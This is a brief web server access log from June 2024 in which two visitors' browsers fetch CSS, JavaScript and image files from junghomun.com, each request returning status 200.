211.36.140.40 - - [27/Jun/2024:16:14:47 +0000] "GET /static/css/main.b87daa8b.css HTTP/1.1" 200 366783 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.40 - - [27/Jun/2024:16:14:47 +0000] "GET /static/js/main.8d2795c4.js HTTP/1.1" 200 38575867 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.40 - - [27/Jun/2024:16:15:06 +0000] "GET /static/media/logo2.67bbeba334a6dba22186.webp HTTP/1.1" 200 259014 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.36.140.40 - - [27/Jun/2024:16:15:07 +0000] "GET /static/media/calendar1.89c348a3ad43be2a45b9.webp HTTP/1.1" 200 12120 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:15:07 +0000] "GET /static/media/user1.fa046da15e89a4780c33.webp HTTP/1.1" 200 34369 "http://www.junghomun.com/user/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:15:07 +0000] "GET /static/media/sleep1.d40c2a1bc215a195d75e.webp HTTP/1.1" 200 13994 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:15:07 +0000] "GET /static/media/money1.916f5b63580b041e485a.webp HTTP/1.1" 200 13072 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
106.102.11.33 - - [27/Jun/2024:16:15:07 +0000] "GET /static/media/logo3.b1396c753a537eb57950.webp HTTP/1.1" 200 49654 "http://www.junghomun.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
